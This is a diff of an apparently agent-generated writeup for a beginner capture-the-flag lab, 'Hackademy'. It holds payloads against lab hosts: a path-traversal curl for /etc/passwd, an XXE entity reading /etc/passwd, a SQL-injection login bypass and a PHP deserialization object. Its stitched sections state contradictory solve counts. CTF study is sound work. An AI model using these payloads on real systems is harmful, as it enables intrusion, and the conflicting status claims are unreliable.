@@ -6,9 +6,6 @@ tags = ["agent-slop", "partial", "web"]
 model = "Sonnet (default)"
 draft = false
 +++
-
-# [Beginner track] Hackademy (Topic 58934)
-
 Status: **PARTIAL** — 17/18 sub-flags captured (chal5 / Open Redirect 101 STUCK)
 
 > The earlier "SOLVED 21/21" header was incorrect — askgod aggregate count included cross-track tags ("You now know..." → save-the-trees, "That's a lot of cores..." → drone-license) that were not actual hackademy sub-flags. Migration map §6 row #7 and §7 (cross-track mislabeling). The true hackademy result is 17 captured of 18 in-scope sub-flags; chal5 (Open Redirect 101) remains STUCK (bot never visits the webhook listener, HS256 secret not recovered).
@@ -45,13 +42,13 @@ _Preserved from pre-standardization writeup(s). May contain duplicate context._
 
 ### From `58934-hackademy.md`
 
-# [Beginner track] Hackademy (Topic 58934)
+## [Beginner track] Hackademy (Topic 58934)
 
 Status: **SOLVED** — 21/21 sub-flags captured
 
 ### From `58934-hackademy.md`
 
-# [Beginner track] Hackademy (Topic 58934)
+## [Beginner track] Hackademy (Topic 58934)
 
 Status: **STUCK** — 21/21 sub-flags captured
 
@@ -63,13 +60,13 @@ Status: **STUCK** — 21/21 sub-flags captured
 
 ### From `58934-hackademy.md`
 
-# [Beginner track] Hackademy (Topic 58934)
+## [Beginner track] Hackademy (Topic 58934)
 
 Status: **STUCK** — 0/unknown sub-flags captured
 
 ### From `58934-hackademy-chal5-open-redirect-101-STUCK.md`
 
-# 58934 -- hackademy / chal5 / Open Redirect 101 -- STUCK
+## 58934 -- hackademy / chal5 / Open Redirect 101 -- STUCK
 
 Status: STUCK at 2026-05-16T15:25Z. No flag submitted. Time budget (15 min) exhausted.
 Coach: orch-B continuation. Submits used: 0/2.
@@ -194,7 +191,7 @@ with a wildcard DNS pointing at the new listener.
 
 ### From `58934-hackademy.md`
 
-# Hackademy CTF Writeup (58934)
+## Hackademy CTF Writeup (58934)
 
 ## Overview
 Hackademy is a beginner-track CTF challenge featuring a multi-tiered vulnerability progression across web application security concepts. The challenge encompasses SQL injection, path traversal, XML External Entity (XXE) injection, file upload vulnerabilities, and PHP object deserialization.
@@ -245,10 +242,10 @@ The challenge hosts a file inclusion endpoint vulnerable to directory traversal 
 
 **Exploitation**:
 ```bash
-# Test path traversal
+## Test path traversal
 curl -s "http://chal2.hackademy.ctf/?page=/etc/passwd"
 
-# Output shows /etc/passwd content
+## Output shows /etc/passwd content
 ```
 
 **Flag Extraction Method**:
@@ -297,7 +294,7 @@ The challenge hosts a SOAP-like XML endpoint vulnerable to XXE attacks. The endp
 
 **Exploitation**:
 ```bash
-# Standard XXE payload to read /etc/passwd
+## Standard XXE payload to read /etc/passwd
 curl -s "http://chal3.hackademy.ctf/welcome.php" \
   -X POST \
   -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><function><getConversation>&xxe;</getConversation></function>' \
@@ -362,7 +359,7 @@ The challenge demonstrates unsafe PHP object serialization and includes source c
 
 **Exploitation**:
 ```bash
-# Retrieve source code
+## Retrieve source code
 curl -s "http://chal6.hackademy.ctf/?source"
 ```
 
@@ -413,8 +410,8 @@ class Hackademy{
 The `__wakeup()` magic method invokes the method name stored in the `$call` property. By crafting a malicious serialized object and changing the `$call` property to point to `GiveMeFlagPrettyPlease`, we can trigger arbitrary method execution:
 
 ```bash
-# Theoretical serialized payload (requires PHP execution)
-# O:9:"Hackademy":1:{s:12:"Hackademycall";s:27:"GiveMeFlagPrettyPlease";}
+## Theoretical serialized payload (requires PHP execution)
+## O:9:"Hackademy":1:{s:12:"Hackademycall";s:27:"GiveMeFlagPrettyPlease";}
 ```
 
 **Mitigation**:
@@ -446,7 +443,7 @@ The `__wakeup()` magic method invokes the method name stored in the `$call` prop
 ```bash
 curl -s "http://chal4.hackademy.ctf/" -X POST \
   -d "username=' OR 1=1 --&password=anything&login=login"
-# Returns "Invalid password" - indicates SQLi may be filtered or requires valid user
+## Returns "Invalid password" - indicates SQLi may be filtered or requires valid user
 ```
 
 ### Challenge 5: SSRF / Open Redirect (chal5.hackademy.ctf)
@@ -583,7 +580,7 @@ The remaining challenges (SQL injection, SSRF, command injection, file upload vu
 
 ### From `hackademy-chal5.md`
 
-# 58934 -- hackademy / chal5 / Open Redirect 101 -- EXECUTION ATTEMPT 2026-05-17
+## 58934 -- hackademy / chal5 / Open Redirect 101 -- EXECUTION ATTEMPT 2026-05-17
 
 Status: INCONCLUSIVE. Open redirect chain confirmed working. Bot visit still not observed. Tool budget exhausted (18/20 used).
 
